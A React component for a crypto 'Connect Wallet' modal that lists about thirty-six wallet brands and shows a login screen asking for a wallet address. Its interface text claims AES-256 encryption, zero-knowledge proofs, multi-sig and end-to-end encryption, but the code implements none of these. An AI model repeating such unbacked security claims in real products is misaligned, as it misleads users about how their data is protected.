"use client";

import React, { useState } from "react";
import Image from "next/image";
import { 
  Dialog, 
  DialogContent, 
  DialogHeader, 
  DialogTitle, 
  DialogTrigger 
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { 
  Search, 
  Lock, 
  Eye, 
  Key, 
  ShieldCheck, 
  ChevronLeft, 
  Info, 
  Shield, 
  X
} from "lucide-react";
import { Button } from "@/components/ui/button";

interface Wallet {
  name: string;
  desc: string;
  e2e: boolean;
  icon: string;
}

const wallets: Wallet[] = [
  { name: "METAMASK", desc: "BROWSER EXTENSION", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Manifest_Icon.svg" },
  { name: "PHANTOM", desc: "BROWSER EXTENSION", e2e: true, icon: "https://phantom.app/img/logo.png" },
  { name: "COINBASE WALLET", desc: "MOBILE/DESKTOP", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/d/de/Coinbase_Logo_2021.svg" },
  { name: "TRUST WALLET", desc: "MOBILE", e2e: true, icon: "https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.svg" },
  { name: "NABOX", desc: "EXTENSION/MOBILE", e2e: true, icon: "https://nabox.io/favicon.ico" },
  { name: "TAP WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://tap.global/favicon.ico" },
  { name: "ROBINHOOD WALLET", desc: "MOBILE", e2e: true, icon: "https://robinhood.com/favicon.ico" },
  { name: "TONKEEPER", desc: "MOBILE/EXTENSION", e2e: true, icon: "https://tonkeeper.com/favicon.ico" },
  { name: "ENJIN WALLET", desc: "MOBILE", e2e: true, icon: "https://enjin.io/favicon.ico" },
  { name: "SAFEPAL", desc: "HARDWARE/MOBILE", e2e: true, icon: "https://safepal.com/favicon.ico" },
  { name: "PETRA", desc: "BROWSER EXTENSION", e2e: true, icon: "https://petra.app/favicon.ico" },
  { name: "MARTIAN", desc: "BROWSER EXTENSION", e2e: true, icon: "https://martianwallet.xyz/favicon.ico" },
  { name: "SUI WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://sui.io/favicon.png" },
  { name: "CORE", desc: "EXTENSION/MOBILE", e2e: true, icon: "https://core.app/favicon.ico" },
  { name: "EXODUS", desc: "DESKTOP/MOBILE", e2e: true, icon: "https://www.exodus.com/favicon.ico" },
  { name: "KEPLR", desc: "BROWSER EXTENSION", e2e: true, icon: "https://www.keplr.app/favicon.ico" },
  { name: "ATOMIC WALLET", desc: "DESKTOP/MOBILE", e2e: true, icon: "https://atomicwallet.io/favicon.ico" },
  { name: "LEAP COSMOS", desc: "BROWSER EXTENSION", e2e: true, icon: "https://www.leapwallet.io/favicon.ico" },
  { name: "CAKE WALLET", desc: "MOBILE", e2e: true, icon: "https://cakewallet.com/favicon.ico" },
  { name: "GUARDA", desc: "DESKTOP/MOBILE", e2e: true, icon: "https://guarda.com/favicon.ico" },
  { name: "BINANCE WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://bin.bnbstatic.com/static/images/home/binance-logo.png" },
  { name: "OKX WALLET", desc: "MOBILE/EXTENSION", e2e: true, icon: "https://www.okx.com/cdn/assets/imgs/221/9E9A9B4B8B6A4A9C.png" },
  { name: "SOLFLARE", desc: "EXTENSION/MOBILE", e2e: true, icon: "https://solflare.com/assets/logo.svg" },
  { name: "LEDGER", desc: "HARDWARE", e2e: true, icon: "https://www.ledger.com/wp-content/uploads/2021/11/ledger-logo.png" },
  { name: "TREZOR", desc: "HARDWARE", e2e: true, icon: "https://trezor.io/static/images/trezor-logo.png" },
  { name: "BITGET WALLET", desc: "MOBILE/EXTENSION", e2e: true, icon: "https://img.bitgetimg.com/multi-language/web/1701074127608_bitget-logo.png" },
  { name: "UNISWAP WALLET", desc: "MOBILE", e2e: true, icon: "https://raw.githubusercontent.com/Uniswap/assets/master/logos/uniswap_logo.svg" },
  { name: "CRYPTO.COM", desc: "MOBILE", e2e: true, icon: "https://crypto.com/favicon.ico" },
  { name: "JUPITER WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://jup.ag/favicon.ico" },
  { name: "RABBY WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://rabby.io/favicon.ico" },
  { name: "STARGAZER WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://stargazer-wallet.io/favicon.ico" },
  { name: "TANGEM", desc: "HARDWARE", e2e: true, icon: "https://tangem.com/favicon.ico" },
  { name: "NEAR MOBILE", desc: "MOBILE", e2e: true, icon: "https://near.org/favicon.ico" },
  { name: "STARKEY WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://starkey.app/favicon.ico" },
  { name: "TAP", desc: "BROWSER EXTENSION", e2e: true, icon: "https://tap.global/favicon.ico" },
  { name: "OTHER WALLET", desc: "CUSTOM", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/e/e4/Wallet_Flat_Icon.svg" },
];

export function WalletModal({ children }: { children: React.ReactNode }) {
  const [search, setSearch] = useState("");
  const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);

  const filteredWallets = wallets.filter(w => 
    w.name.toLowerCase().includes(search.toLowerCase())
  );

  const resetState = () => {
    setSelectedWallet(null);
    setSearch("");
  };

  return (
    <Dialog onOpenChange={(open) => { if (!open) resetState(); }}>
      <DialogTrigger asChild>
        {children}
      </DialogTrigger>
      <DialogContent className="max-w-[440px] bg-[#0B0F17] border-white/5 p-0 gap-0 overflow-hidden text-white sm:rounded-[2rem] transition-all duration-300">
        <DialogHeader className="sr-only">
          <DialogTitle>{selectedWallet ? `Login ${selectedWallet.name}` : "Connect Wallet"}</DialogTitle>
        </DialogHeader>
        
        {!selectedWallet ? (
          <>
            <div className="p-6 pb-0">
              <div className="relative mb-6">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 w-4 h-4" />
                <Input 
                  placeholder="Search for your wallet..." 
                  className="bg-[#0D161F] border-none h-12 pl-12 text-sm focus-visible:ring-1 focus-visible:ring-primary/50 rounded-xl"
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                />
              </div>

              <div className="grid grid-cols-1 gap-3 max-h-[400px] overflow-y-auto pr-2 custom-scrollbar pb-6">
                {filteredWallets.map((wallet) => (
                  <button 
                    key={wallet.name}
                    onClick={() => setSelectedWallet(wallet)}
                    className="flex items-center gap-4 p-4 rounded-xl bg-[#0D161F]/50 border border-white/5 hover:border-primary/30 hover:bg-[#131C26] transition-all group text-left"
                  >
                    <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center p-1.5 relative shrink-0">
                      <div className="w-full h-full relative">
                        <Image 
                          src={wallet.icon} 
                          alt={wallet.name}
                          fill
                          className="object-contain p-0.5"
                          unoptimized={wallet.icon.endsWith('.svg') || wallet.icon.endsWith('.ico')}
                        />
                      </div>
                    </div>
                    <div className="flex-1">
                      <div className="text-sm font-headline font-bold tracking-tight">{wallet.name}</div>
                      <div className="flex items-center gap-1">
                        <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">{wallet.desc}</span>
                        {wallet.e2e && (
                          <>
                            <span className="text-[10px] text-slate-500">•</span>
                            <span className="text-[10px] text-primary flex items-center gap-1 font-bold">
                              <Lock size={8} /> E2E
                            </span>
                          </>
                        )}
                      </div>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            <div className="p-8 border-t border-white/5 bg-[#080C14]">
              <div className="grid grid-cols-3 gap-8 mb-8">
                <div className="space-y-2 text-center md:text-left">
                  <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center mx-auto md:mx-0">
                    <Lock className="text-primary w-4 h-4" />
                  </div>
                  <div className="font-headline text-xs font-black tracking-widest uppercase">Encryption</div>
                  <div className="text-[10px] text-slate-500 font-medium uppercase tracking-tight">AES-256 standards</div>
                </div>
                <div className="space-y-2 text-center md:text-left">
                  <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center mx-auto md:mx-0">
                    <Eye className="text-primary w-4 h-4" />
                  </div>
                  <div className="font-headline text-xs font-black tracking-widest uppercase">ZK-Proof</div>
                  <div className="text-[10px] text-slate-500 font-medium uppercase tracking-tight">Zero disclosure</div>
                </div>
                <div className="space-y-2 text-center md:text-left">
                  <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center mx-auto md:mx-0">
                    <Key className="text-primary w-4 h-4" />
                  </div>
                  <div className="font-headline text-xs font-black tracking-widest uppercase">Multi-sig</div>
                  <div className="text-[10px] text-slate-500 font-medium uppercase tracking-tight">Layered security</div>
                </div>
              </div>

              <div className="w-full h-12 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center gap-3 text-primary text-[10px] font-bold uppercase tracking-[0.2em]">
                <ShieldCheck size={14} />
                Institutional Grade Security Protocols Active
              </div>
            </div>
          </>
        ) : (
          <div className="flex flex-col animate-in fade-in slide-in-from-right-4 duration-300">
            {/* Login Header */}
            <div className="p-6 pb-0 flex items-center justify-between">
              <button 
                onClick={() => setSelectedWallet(null)}
                className="w-10 h-10 rounded-xl bg-[#0D161F] border border-white/5 flex items-center justify-center hover:bg-[#131C26] transition-colors group"
              >
                <ChevronLeft size={20} className="text-slate-400 group-hover:text-white" />
              </button>
              
              <div className="w-12 h-12 rounded-xl bg-[#0D161F] border border-white/5 flex items-center justify-center p-2 relative">
                <Image 
                  src={selectedWallet.icon} 
                  alt={selectedWallet.name}
                  fill
                  className="object-contain p-2"
                  unoptimized={selectedWallet.icon.endsWith('.svg') || selectedWallet.icon.endsWith('.ico')}
                />
              </div>

              <div className="w-10" /> {/* Spacer */}
            </div>

            <div className="p-8 pt-10 text-center">
              <h3 className="font-headline text-2xl font-black mb-2 uppercase tracking-tight">
                LOGIN {selectedWallet.name}
              </h3>
              <p className="text-slate-500 text-sm font-medium mb-10">
                Initialize secure validation protocol
              </p>

              <div className="space-y-6 text-left">
                <div className="space-y-3">
                  <label className="text-[10px] font-headline font-black uppercase tracking-[0.2em] text-slate-500 ml-1">
                    Wallet Address
                  </label>
                  <Input 
                    placeholder="0x..." 
                    className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm focus-visible:ring-1 focus-visible:ring-primary/50 rounded-2xl placeholder:text-slate-700"
                  />
                </div>

                <div className="p-4 rounded-2xl bg-[#0F222F]/50 border border-[#1A3A4D] flex gap-4 items-start">
                  <Info className="text-[#38BDF8] shrink-0 mt-1" size={18} />
                  <p className="text-[11px] text-slate-400 leading-relaxed">
                    Your address is strictly used for validation. It will be encrypted via <span className="text-slate-200">AES-256</span> before being sent to the secure endpoint.
                  </p>
                </div>

                <Button className="w-full h-14 bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-black text-xs uppercase tracking-[0.2em] rounded-2xl gap-3 shadow-lg shadow-orange-500/10">
                  <Shield size={16} />
                  Login In
                </Button>
              </div>
            </div>

            <div className="mt-4 pb-8 text-center">
              <div className="flex items-center justify-center gap-2 text-[10px] text-slate-600 font-bold uppercase tracking-[0.3em]">
                <Lock size={12} />
                End-To-End Encrypted
              </div>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}
